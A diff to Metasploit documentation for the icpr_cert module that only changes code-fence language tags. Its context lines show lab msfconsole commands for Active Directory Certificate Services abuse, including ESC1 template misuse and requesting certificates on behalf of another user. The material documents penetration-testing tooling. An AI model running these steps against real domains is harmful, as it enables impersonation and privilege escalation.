@@ -48,7 +48,7 @@ Request a certificate. The certificate PFX file will be stored on success. The c
 For this module to work, it's necessary to know the name of a CA and certificate template. These values can be obtained
 by a normal user via LDAP.
 
-```
+```msf
 msf6 > use auxiliary/gather/ldap_query
 msf6 auxiliary(gather/ldap_query) > set BIND_DN aliddle@msflab.local
 BIND_DN => aliddle@msflab.local
@@ -82,7 +82,7 @@ msf6 auxiliary(gather/ldap_query) >
 In this scenario, an authenticated user issues a certificate for themselves using the `User` template which is available
 by default. The user must know the CA name, which in this case is `msflab-DC-CA`.
 
-```
+```msf
 msf6 > use auxiliary/admin/dcerpc/icpr_cert
 msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 192.168.159.10
 RHOSTS => 192.168.159.10
@@ -122,7 +122,7 @@ The user must know:
 See [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2) section on ESC1 for more
 information.
 
-```
+```msf
 msf6 > use auxiliary/admin/dcerpc/icpr_cert
 msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 192.168.159.10
 RHOSTS => 192.168.159.10
@@ -165,7 +165,7 @@ information.
 #### Step 1
 The first step is to issue a certificate using the vulnerable certificate template.
 
-```
+```msf
 msf6 > use auxiliary/admin/dcerpc/icpr_cert 
 msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 192.168.159.10
 RHOSTS => 192.168.159.10
@@ -195,7 +195,7 @@ The second step is to run the module a second time, using the certificate templa
 the target user. The `CERT_TEMPLATE` option is updated to one allowing authentication such as the default `User`
 template.
 
-```
+```msf
 msf6 auxiliary(admin/dcerpc/icpr_cert) > set PFX /home/smcintyre/.msf4/loot/20221107153602_default_unknown_windows.ad.cs_269882.pfx
 PFX => /home/smcintyre/.msf4/loot/20221107153602_default_unknown_windows.ad.cs_269882.pfx
 msf6 auxiliary(admin/dcerpc/icpr_cert) > set ON_BEHALF_OF MSFLAB\\smcintyre
@@ -233,7 +233,7 @@ request another certificate on behalf of the target account.
 #### Step 1
 The first step is to issue a certificate using the vulnerable certificate template.
 
-```
+```msf
 msf6 > use auxiliary/admin/dcerpc/icpr_cert
 msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 192.168.159.10
 RHOSTS => 192.168.159.10
@@ -265,7 +265,7 @@ The second step is to run the module a second time, using the certificate templa
 the target user. The `CERT_TEMPLATE` option is updated to one allowing authentication such as the default `User`
 template.
 
-```
+```msf
 msf6 auxiliary(admin/dcerpc/icpr_cert) > set PFX /home/smcintyre/.msf4/loot/20221107154656_default_unknown_windows.ad.cs_831021.pfx
 PFX => /home/smcintyre/.msf4/loot/20221107154656_default_unknown_windows.ad.cs_831021.pfx
 msf6 auxiliary(admin/dcerpc/icpr_cert) > set ON_BEHALF_OF MSFLAB\\smcintyre
